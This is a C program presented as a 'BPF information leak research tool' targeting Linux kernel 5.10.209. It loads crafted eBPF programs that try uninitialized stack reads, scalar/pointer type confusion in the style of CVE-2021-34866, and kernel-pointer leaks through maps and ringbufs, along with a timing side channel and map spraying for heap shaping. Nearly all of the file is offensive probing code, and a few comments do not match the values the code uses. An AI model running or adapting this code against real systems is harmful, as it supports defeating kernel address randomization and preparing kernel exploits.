/*
 * BPF Information Leak Research Tool v2
 * Target: Kernel 5.10.209
 *
 * Focus Areas:
 * 1. BPF Map Value Leak (uninitialized memory)
 * 2. BPF Stack Leak
 * 3. BPF Helper Side Effects
 * 4. Timing Side Channels
 * 5. CVE-2021-34866 style scalar spill/fill
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <linux/bpf.h>
#include <stdint.h>
#include <time.h>
#include <fcntl.h>

#ifndef __NR_bpf
#define __NR_bpf 280
#endif

static inline int bpf(int cmd, union bpf_attr *attr, unsigned int size)
{
    return syscall(__NR_bpf, cmd, attr, size);
}

/* BPF Instruction Macros */
#define BPF_RAW_INSN(OP, DST, SRC, OFF, IMM) \
    ((struct bpf_insn){.code = OP, .dst_reg = DST, .src_reg = SRC, .off = OFF, .imm = IMM})

#define BPF_MOV64_REG(DST, SRC) \
    BPF_RAW_INSN(BPF_ALU64 | BPF_MOV | BPF_X, DST, SRC, 0, 0)

#define BPF_MOV64_IMM(DST, IMM) \
    BPF_RAW_INSN(BPF_ALU64 | BPF_MOV | BPF_K, DST, 0, 0, IMM)

#define BPF_MOV32_IMM(DST, IMM) \
    BPF_RAW_INSN(BPF_ALU | BPF_MOV | BPF_K, DST, 0, 0, IMM)

#define BPF_LD_MAP_FD(DST, FD)                                              \
    BPF_RAW_INSN(BPF_LD | BPF_DW | BPF_IMM, DST, BPF_PSEUDO_MAP_FD, 0, FD), \
        BPF_RAW_INSN(0, 0, 0, 0, 0)

#define BPF_STX_MEM(SIZE, DST, SRC, OFF) \
    BPF_RAW_INSN(BPF_STX | BPF_SIZE(SIZE) | BPF_MEM, DST, SRC, OFF, 0)

#define BPF_ST_MEM(SIZE, DST, OFF, IMM) \
    BPF_RAW_INSN(BPF_ST | BPF_SIZE(SIZE) | BPF_MEM, DST, 0, OFF, IMM)

#define BPF_LDX_MEM(SIZE, DST, SRC, OFF) \
    BPF_RAW_INSN(BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM, DST, SRC, OFF, 0)

#define BPF_EMIT_CALL(FUNC) \
    BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, FUNC)

#define BPF_EXIT_INSN() \
    BPF_RAW_INSN(BPF_JMP | BPF_EXIT, 0, 0, 0, 0)

#define BPF_JMP_IMM(OP, DST, IMM, OFF) \
    BPF_RAW_INSN(BPF_JMP | BPF_OP(OP) | BPF_K, DST, 0, OFF, IMM)

#define BPF_ALU64_IMM(OP, DST, IMM) \
    BPF_RAW_INSN(BPF_ALU64 | BPF_OP(OP) | BPF_K, DST, 0, 0, IMM)

#define BPF_ALU64_REG(OP, DST, SRC) \
    BPF_RAW_INSN(BPF_ALU64 | BPF_OP(OP) | BPF_X, DST, SRC, 0, 0)

/* BPF size */
#define BPF_SIZE(code) ((code) & 0x18)
#define BPF_B 0x10
#define BPF_H 0x08
#define BPF_W 0x00
#define BPF_DW 0x18

/* BPF operations */
#define BPF_OP(code) ((code) & 0xf0)
#define BPF_ADD 0x00
#define BPF_SUB 0x10
#define BPF_MUL 0x20
#define BPF_DIV 0x30
#define BPF_OR 0x40
#define BPF_AND 0x50
#define BPF_LSH 0x60
#define BPF_RSH 0x70
#define BPF_NEG 0x80
#define BPF_MOD 0x90
#define BPF_XOR 0xa0
#define BPF_MOV 0xb0
#define BPF_ARSH 0xc0

/* BPF jump ops */
#define BPF_JA 0x00
#define BPF_JEQ 0x10
#define BPF_JGT 0x20
#define BPF_JGE 0x30
#define BPF_JSET 0x40
#define BPF_JNE 0x50
#define BPF_JLT 0xa0
#define BPF_JLE 0xb0

/* BPF helpers */
#define BPF_FUNC_map_lookup_elem 1
#define BPF_FUNC_map_update_elem 2
#define BPF_FUNC_map_delete_elem 3
#define BPF_FUNC_ktime_get_ns 5
#define BPF_FUNC_get_prandom_u32 7
#define BPF_FUNC_get_smp_processor_id 8
#define BPF_FUNC_tail_call 12
#define BPF_FUNC_get_current_pid_tgid 14
#define BPF_FUNC_get_current_uid_gid 15

/* BPF pseudo map fd */
#define BPF_PSEUDO_MAP_FD 1

/* Registers */
#define BPF_REG_0 0
#define BPF_REG_1 1
#define BPF_REG_2 2
#define BPF_REG_3 3
#define BPF_REG_4 4
#define BPF_REG_5 5
#define BPF_REG_6 6
#define BPF_REG_7 7
#define BPF_REG_8 8
#define BPF_REG_9 9
#define BPF_REG_10 10
#define BPF_REG_FP BPF_REG_10

/* Classes */
#define BPF_LD 0x00
#define BPF_LDX 0x01
#define BPF_ST 0x02
#define BPF_STX 0x03
#define BPF_ALU 0x04
#define BPF_JMP 0x05
#define BPF_ALU64 0x07

#define BPF_MEM 0x60
#define BPF_IMM 0x00
#define BPF_K 0x00
#define BPF_X 0x08

#define BPF_CALL 0x80
#define BPF_EXIT 0x90

int create_array_map(int value_size, int max_entries)
{
    union bpf_attr attr = {
        .map_type = BPF_MAP_TYPE_ARRAY,
        .key_size = 4,
        .value_size = value_size,
        .max_entries = max_entries,
    };
    return bpf(BPF_MAP_CREATE, &attr, sizeof(attr));
}

int create_hash_map(int value_size, int max_entries)
{
    union bpf_attr attr = {
        .map_type = BPF_MAP_TYPE_HASH,
        .key_size = 4,
        .value_size = value_size,
        .max_entries = max_entries,
    };
    return bpf(BPF_MAP_CREATE, &attr, sizeof(attr));
}

int map_lookup_elem(int fd, void *key, void *value)
{
    union bpf_attr attr = {
        .map_fd = fd,
        .key = (uint64_t)key,
        .value = (uint64_t)value,
    };
    return bpf(BPF_MAP_LOOKUP_ELEM, &attr, sizeof(attr));
}

int map_update_elem(int fd, void *key, void *value, uint64_t flags)
{
    union bpf_attr attr = {
        .map_fd = fd,
        .key = (uint64_t)key,
        .value = (uint64_t)value,
        .flags = flags,
    };
    return bpf(BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr));
}

int load_prog(struct bpf_insn *insns, int insn_cnt, char *log_buf, int log_size)
{
    union bpf_attr attr = {
        .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
        .insns = (uint64_t)insns,
        .insn_cnt = insn_cnt,
        .license = (uint64_t)"GPL",
        .log_buf = (uint64_t)log_buf,
        .log_size = log_size,
        .log_level = log_buf ? 1 : 0,
    };
    return bpf(BPF_PROG_LOAD, &attr, sizeof(attr));
}

void hexdump(const char *desc, void *addr, int len)
{
    int i;
    unsigned char *pc = (unsigned char *)addr;

    if (desc != NULL)
        printf("%s:\n", desc);

    for (i = 0; i < len; i++)
    {
        if ((i % 16) == 0)
        {
            if (i != 0)
                printf("\n");
            printf("  %04x: ", i);
        }
        printf("%02x ", pc[i]);
    }
    printf("\n");
}

int check_for_kernel_ptrs(void *buf, int size)
{
    uint64_t *ptr = (uint64_t *)buf;
    int count = size / 8;
    int found = 0;

    for (int i = 0; i < count; i++)
    {
        uint64_t val = ptr[i];
        // Check for kernel address range on ARM64 (0xffff...)
        if ((val & 0xffff000000000000ULL) == 0xffff000000000000ULL)
        {
            printf("  [!] Potential kernel pointer at offset %d: 0x%016lx\n", i * 8, val);
            found++;
        }
        // Check for kernel module range
        if ((val & 0xfffffc0000000000ULL) == 0xfffffc0000000000ULL)
        {
            printf("  [!] Potential module pointer at offset %d: 0x%016lx\n", i * 8, val);
            found++;
        }
    }
    return found;
}

/*
 * Test 1: BPF Map Uninitialized Memory Leak
 * Create a map with large value, update partially, read to see uninit data
 */
void test_map_uninit_leak()
{
    printf("\n=== Test 1: BPF Map Uninitialized Memory Leak ===\n");

    int map_fd = create_array_map(256, 16);
    if (map_fd < 0)
    {
        printf("[-] Failed to create map: %s\n", strerror(errno));
        return;
    }
    printf("[+] Created array map (256 bytes value, 16 entries)\n");

    // Read values without writing first
    for (int i = 0; i < 4; i++)
    {
        uint32_t key = i;
        uint8_t value[256];
        memset(value, 0xAA, sizeof(value)); // Mark buffer

        if (map_lookup_elem(map_fd, &key, value) < 0)
        {
            printf("[-] Lookup key %d failed: %s\n", i, strerror(errno));
            continue;
        }

        // Check if we got any non-zero data (potential leak)
        int non_zero = 0;
        for (int j = 0; j < 256; j++)
        {
            if (value[j] != 0)
                non_zero++;
        }

        if (non_zero > 0)
        {
            printf("[!] Key %d: %d non-zero bytes found\n", i, non_zero);
            if (non_zero < 256)
            {
                hexdump("Leaked data", value, 64);
                check_for_kernel_ptrs(value, 256);
            }
        }
    }

    close(map_fd);
}

/*
 * Test 2: BPF Stack Spill/Fill Leak (CVE-2021-34866 style)
 * Try to read uninitialized stack slots
 */
void test_stack_spill_fill()
{
    printf("\n=== Test 2: BPF Stack Spill/Fill Analysis ===\n");

    int map_fd = create_array_map(64, 4);
    if (map_fd < 0)
    {
        printf("[-] Failed to create map: %s\n", strerror(errno));
        return;
    }

    // Initialize map entry
    uint32_t key = 0;
    uint64_t init_value[8] = {0};
    map_update_elem(map_fd, &key, init_value, 0);

    /*
     * Program that tries to:
     * 1. Read from deep stack offset (potentially uninitialized)
     * 2. Store to map
     */
    char log_buf[65536];
    struct bpf_insn prog[] = {
        // r6 = fp (save frame pointer)
        BPF_MOV64_REG(BPF_REG_6, BPF_REG_FP),

        // Store key at fp-4
        BPF_ST_MEM(BPF_W, BPF_REG_FP, -4, 0),

        // r1 = map_fd
        BPF_LD_MAP_FD(BPF_REG_1, map_fd),
        // r2 = &key
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_FP),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),
        // call map_lookup_elem
        BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),

        // if (r0 == NULL) exit
        BPF_JMP_IMM(BPF_JEQ, BPF_REG_0, 0, 11),

        // r7 = r0 (save map value pointer)
        BPF_MOV64_REG(BPF_REG_7, BPF_REG_0),

        // Try reading from various stack offsets
        // Read fp-256 (likely uninitialized in verifier's view)
        BPF_LDX_MEM(BPF_DW, BPF_REG_1, BPF_REG_6, -64),
        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_1, 0),

        BPF_LDX_MEM(BPF_DW, BPF_REG_1, BPF_REG_6, -72),
        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_1, 8),

        BPF_LDX_MEM(BPF_DW, BPF_REG_1, BPF_REG_6, -80),
        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_1, 16),

        BPF_LDX_MEM(BPF_DW, BPF_REG_1, BPF_REG_6, -88),
        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_1, 24),

        // return 0
        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),

        // exit path for NULL check
        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),
    };

    int prog_fd = load_prog(prog, sizeof(prog) / sizeof(prog[0]), log_buf, sizeof(log_buf));

    if (prog_fd < 0)
    {
        printf("[-] Program rejected (expected - verifier blocks uninit stack read)\n");
        printf("    Verifier log (first 500 chars):\n");
        log_buf[500] = 0;
        printf("    %s\n", log_buf);
    }
    else
    {
        printf("[!] Program LOADED - potential verifier bypass!\n");
        close(prog_fd);
    }

    close(map_fd);
}

/*
 * Test 3: BPF Timing Side Channel
 * Measure timing differences for different operations
 */
void test_timing_channel()
{
    printf("\n=== Test 3: BPF Timing Side Channel ===\n");

    int map_fd = create_hash_map(8, 1024);
    if (map_fd < 0)
    {
        printf("[-] Failed to create hash map: %s\n", strerror(errno));
        return;
    }

    // Program that does map lookup with timing
    struct bpf_insn prog[] = {
        // Get start time
        BPF_EMIT_CALL(BPF_FUNC_ktime_get_ns),
        BPF_MOV64_REG(BPF_REG_6, BPF_REG_0),

        // Store key
        BPF_ST_MEM(BPF_W, BPF_REG_FP, -4, 0),

        // Map lookup
        BPF_LD_MAP_FD(BPF_REG_1, map_fd),
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_FP),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),
        BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),

        // Get end time
        BPF_EMIT_CALL(BPF_FUNC_ktime_get_ns),

        // Calculate delta: r0 = r0 - r6
        BPF_ALU64_REG(BPF_SUB, BPF_REG_0, BPF_REG_6),

        BPF_EXIT_INSN(),
    };

    char log_buf[4096];
    int prog_fd = load_prog(prog, sizeof(prog) / sizeof(prog[0]), log_buf, sizeof(log_buf));

    if (prog_fd < 0)
    {
        printf("[-] Timing program rejected: %s\n", strerror(errno));
        printf("    Log: %s\n", log_buf);
    }
    else
    {
        printf("[+] Timing program loaded successfully\n");
        printf("[+] Can measure kernel operation timing via BPF\n");
        close(prog_fd);
    }

    close(map_fd);
}

/*
 * Test 4: BPF Helper Return Value Analysis
 * Check what information helpers leak
 */
void test_helper_info_leak()
{
    printf("\n=== Test 4: BPF Helper Information Leak ===\n");

    int map_fd = create_array_map(64, 4);
    if (map_fd < 0)
    {
        printf("[-] Failed to create map: %s\n", strerror(errno));
        return;
    }

    // Initialize map
    uint32_t key = 0;
    uint64_t values[8] = {0};
    map_update_elem(map_fd, &key, values, 0);

    /*
     * Program that collects various helper outputs:
     * - ktime_get_ns
     * - get_smp_processor_id
     * - get_current_pid_tgid
     * - get_current_uid_gid
     * - get_prandom_u32
     */
    struct bpf_insn prog[] = {
        // Store key
        BPF_ST_MEM(BPF_W, BPF_REG_FP, -4, 0),

        // Lookup map
        BPF_LD_MAP_FD(BPF_REG_1, map_fd),
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_FP),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),
        BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),
        BPF_JMP_IMM(BPF_JEQ, BPF_REG_0, 0, 23),
        BPF_MOV64_REG(BPF_REG_6, BPF_REG_0),

        // Get ktime_get_ns
        BPF_EMIT_CALL(BPF_FUNC_ktime_get_ns),
        BPF_STX_MEM(BPF_DW, BPF_REG_6, BPF_REG_0, 0),

        // Get smp_processor_id
        BPF_EMIT_CALL(BPF_FUNC_get_smp_processor_id),
        BPF_STX_MEM(BPF_DW, BPF_REG_6, BPF_REG_0, 8),

        // Get current_pid_tgid
        BPF_EMIT_CALL(BPF_FUNC_get_current_pid_tgid),
        BPF_STX_MEM(BPF_DW, BPF_REG_6, BPF_REG_0, 16),

        // Get current_uid_gid
        BPF_EMIT_CALL(BPF_FUNC_get_current_uid_gid),
        BPF_STX_MEM(BPF_DW, BPF_REG_6, BPF_REG_0, 24),

        // Get prandom
        BPF_EMIT_CALL(BPF_FUNC_get_prandom_u32),
        BPF_STX_MEM(BPF_DW, BPF_REG_6, BPF_REG_0, 32),

        // Second random to check entropy
        BPF_EMIT_CALL(BPF_FUNC_get_prandom_u32),
        BPF_STX_MEM(BPF_DW, BPF_REG_6, BPF_REG_0, 40),

        // Third ktime for timing analysis
        BPF_EMIT_CALL(BPF_FUNC_ktime_get_ns),
        BPF_STX_MEM(BPF_DW, BPF_REG_6, BPF_REG_0, 48),

        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),

        // NULL exit
        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),
    };

    char log_buf[4096];
    int prog_fd = load_prog(prog, sizeof(prog) / sizeof(prog[0]), log_buf, sizeof(log_buf));

    if (prog_fd < 0)
    {
        printf("[-] Helper info program rejected: %s\n", strerror(errno));
    }
    else
    {
        printf("[+] Helper info program loaded\n");
        printf("[+] Can access: ktime_ns, smp_cpu, pid_tgid, uid_gid, prandom\n");
        close(prog_fd);
    }

    close(map_fd);
}

/*
 * Test 5: BPF Pointer Arithmetic Bounds Check
 * Test verifier bounds tracking accuracy
 */
void test_ptr_arith_bounds()
{
    printf("\n=== Test 5: BPF Pointer Arithmetic Bounds ===\n");

    int map_fd = create_array_map(256, 4);
    if (map_fd < 0)
    {
        printf("[-] Failed to create map: %s\n", strerror(errno));
        return;
    }

    // Test case: complex pointer arithmetic that might confuse verifier
    struct bpf_insn prog[] = {
        // Store key = 0
        BPF_ST_MEM(BPF_W, BPF_REG_FP, -4, 0),

        // Lookup map
        BPF_LD_MAP_FD(BPF_REG_1, map_fd),
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_FP),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),
        BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),
        BPF_JMP_IMM(BPF_JEQ, BPF_REG_0, 0, 16),

        // r6 = map_value_ptr
        BPF_MOV64_REG(BPF_REG_6, BPF_REG_0),

        // Get a bounded value
        BPF_EMIT_CALL(BPF_FUNC_get_prandom_u32),
        // r0 is now 0-0xffffffff

        // Try to bound it: r0 &= 0xff (should be 0-255)
        BPF_ALU64_IMM(BPF_AND, BPF_REG_0, 0x7f),

        // Complex arithmetic sequence
        BPF_ALU64_IMM(BPF_MUL, BPF_REG_0, 2),    // 0-254
        BPF_ALU64_IMM(BPF_AND, BPF_REG_0, 0xff), // Still bounded

        // Add to ptr
        BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_0),

        // Try to read - should be within bounds
        BPF_LDX_MEM(BPF_B, BPF_REG_0, BPF_REG_6, 0),

        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),

        // NULL exit
        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),
    };

    char log_buf[8192];
    int prog_fd = load_prog(prog, sizeof(prog) / sizeof(prog[0]), log_buf, sizeof(log_buf));

    if (prog_fd < 0)
    {
        printf("[-] Bounded ptr arith program rejected\n");
        printf("    Verifier analysis:\n");
        // Print relevant parts of log
        char *p = strstr(log_buf, "R6");
        if (p)
        {
            char snippet[500];
            strncpy(snippet, p, 499);
            snippet[499] = 0;
            printf("    %s\n", snippet);
        }
    }
    else
    {
        printf("[+] Bounded pointer arithmetic allowed\n");
        close(prog_fd);
    }

    close(map_fd);
}

/*
 * Test 6: BPF Scalar Confusion Attack (CVE-2021-34866 related)
 * Try to confuse verifier about scalar vs pointer types
 */
void test_scalar_confusion()
{
    printf("\n=== Test 6: Scalar/Pointer Type Confusion ===\n");

    int map_fd = create_array_map(32, 4);
    if (map_fd < 0)
    {
        printf("[-] Failed to create map: %s\n", strerror(errno));
        return;
    }

    /*
     * Attempt: Store a scalar, load it back as pointer-like value
     * This shouldn't work on patched kernels
     */
    struct bpf_insn prog[] = {
        BPF_ST_MEM(BPF_W, BPF_REG_FP, -4, 0),

        BPF_LD_MAP_FD(BPF_REG_1, map_fd),
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_FP),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),
        BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),
        BPF_JMP_IMM(BPF_JEQ, BPF_REG_0, 0, 13),

        BPF_MOV64_REG(BPF_REG_6, BPF_REG_0),

        // Store fp to stack
        BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_10, -16),

        // Get a random scalar
        BPF_EMIT_CALL(BPF_FUNC_get_prandom_u32),

        // XOR with stored value
        BPF_LDX_MEM(BPF_DW, BPF_REG_1, BPF_REG_FP, -16),
        BPF_ALU64_REG(BPF_XOR, BPF_REG_0, BPF_REG_1),

        // Store result to map
        BPF_STX_MEM(BPF_DW, BPF_REG_6, BPF_REG_0, 0),

        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),

        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),
    };

    char log_buf[8192];
    int prog_fd = load_prog(prog, sizeof(prog) / sizeof(prog[0]), log_buf, sizeof(log_buf));

    if (prog_fd < 0)
    {
        printf("[-] Scalar confusion test rejected (expected on patched)\n");
        // Check for specific rejection
        if (strstr(log_buf, "pointer arithmetic"))
        {
            printf("    Reason: pointer arithmetic restriction\n");
        }
        else if (strstr(log_buf, "type mismatch"))
        {
            printf("    Reason: type mismatch detection\n");
        }
    }
    else
    {
        printf("[!] Scalar confusion program LOADED - potential issue!\n");
        // Try to read leaked value
        uint32_t key = 0;
        uint64_t value[4];
        if (map_lookup_elem(map_fd, &key, value) == 0)
        {
            printf("    Leaked value: 0x%016lx\n", value[0]);
            if ((value[0] & 0xffff000000000000ULL) == 0xffff000000000000ULL)
            {
                printf("    [!!!] Possible kernel pointer leak!\n");
            }
        }
        close(prog_fd);
    }

    close(map_fd);
}

/*
 * Test 7: Multiple Map Type Spray for Heap Shaping
 */
void test_heap_shape_spray()
{
    printf("\n=== Test 7: Heap Shape Analysis via Maps ===\n");

    int fds[64];
    int success = 0;

    // Create maps with various sizes to understand slab behavior
    int sizes[] = {16, 32, 64, 96, 128, 192, 256, 512, 1024, 2048, 4096};

    for (int s = 0; s < sizeof(sizes) / sizeof(sizes[0]); s++)
    {
        int size = sizes[s];
        int count = 0;

        for (int i = 0; i < 8; i++)
        {
            int fd = create_array_map(size, 16);
            if (fd >= 0)
            {
                fds[success++] = fd;
                count++;
            }
        }
        printf("[+] Size %4d bytes: created %d maps\n", size, count);
    }

    printf("\n[*] Total maps created: %d\n", success);
    printf("[*] This provides controlled heap allocation primitives\n");

    // Cleanup
    for (int i = 0; i < success; i++)
    {
        close(fds[i]);
    }
}

/*
 * Test 8: BPF Ringbuf Analysis (if available)
 */
void test_ringbuf_leak()
{
    printf("\n=== Test 8: BPF Ringbuf Analysis ===\n");

    union bpf_attr attr = {
        .map_type = BPF_MAP_TYPE_RINGBUF,
        .key_size = 0,
        .value_size = 0,
        .max_entries = 4096, // Page size
    };

    int fd = bpf(BPF_MAP_CREATE, &attr, sizeof(attr));
    if (fd < 0)
    {
        printf("[-] Ringbuf creation failed: %s\n", strerror(errno));
        printf("    (May need newer kernel or CAP_BPF)\n");
        return;
    }

    printf("[+] Ringbuf created (fd=%d)\n", fd);

    // Try to mmap it
    void *ptr = mmap(NULL, 4096, PROT_READ, MAP_SHARED, fd, 0);
    if (ptr == MAP_FAILED)
    {
        printf("[-] Ringbuf mmap failed: %s\n", strerror(errno));
    }
    else
    {
        printf("[+] Ringbuf mmap succeeded at %p\n", ptr);
        // Check for interesting data
        hexdump("Ringbuf content", ptr, 64);
        check_for_kernel_ptrs(ptr, 4096);
        munmap(ptr, 4096);
    }

    close(fd);
}

int main()
{
    printf("================================================\n");
    printf(" BPF Information Leak Research Tool v2\n");
    printf(" Target: Kernel 5.10.209\n");
    printf("================================================\n\n");

    // Check BPF availability
    int test_fd = create_array_map(8, 1);
    if (test_fd < 0)
    {
        printf("[-] BPF not available or permission denied\n");
        return 1;
    }
    close(test_fd);
    printf("[+] BPF subsystem accessible\n");

    // Run all tests
    test_map_uninit_leak();
    test_stack_spill_fill();
    test_timing_channel();
    test_helper_info_leak();
    test_ptr_arith_bounds();
    test_scalar_confusion();
    test_heap_shape_spray();
    test_ringbuf_leak();

    printf("\n================================================\n");
    printf(" Research Complete\n");
    printf("================================================\n");

    return 0;
}
